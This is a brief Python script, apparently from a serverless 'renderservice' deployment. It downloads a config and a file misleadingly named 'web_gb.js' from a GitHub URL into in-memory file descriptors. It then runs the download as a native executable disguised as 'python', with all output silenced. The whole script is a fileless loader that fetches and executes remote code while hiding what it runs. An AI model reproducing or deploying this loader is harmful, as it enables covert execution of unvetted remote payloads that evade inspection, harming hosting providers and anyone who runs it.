
import os
import subprocess
import urllib.request

urlbase='https://raw.githubusercontent.com/ximiximi1/renderservice/main/serverless/'

fdconfig=os.memfd_create ("myconfig", os.MFD_CLOEXEC)
configurl=urlbase+'myconfig3'
urllib.request.urlretrieve(configurl,"/proc/self/fd/%d" % fdconfig)

os.lseek(fdconfig, 0, os.SEEK_SET)


fdpython=os.memfd_create ("python", os.MFD_CLOEXEC)
pythonurl=urlbase+'web_gb.js'
urllib.request.urlretrieve(pythonurl,"/proc/self/fd/%d" % fdpython)

if os.environ.get('PORT')==None:
    port=8888
else:
    port=os.environ.get('PORT')

process=subprocess.Popen(args=["python"], executable="/proc/self/fd/%d" % fdpython,stdin=fdconfig,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,close_fds=False,env={'PORT':str(port)})
process.wait()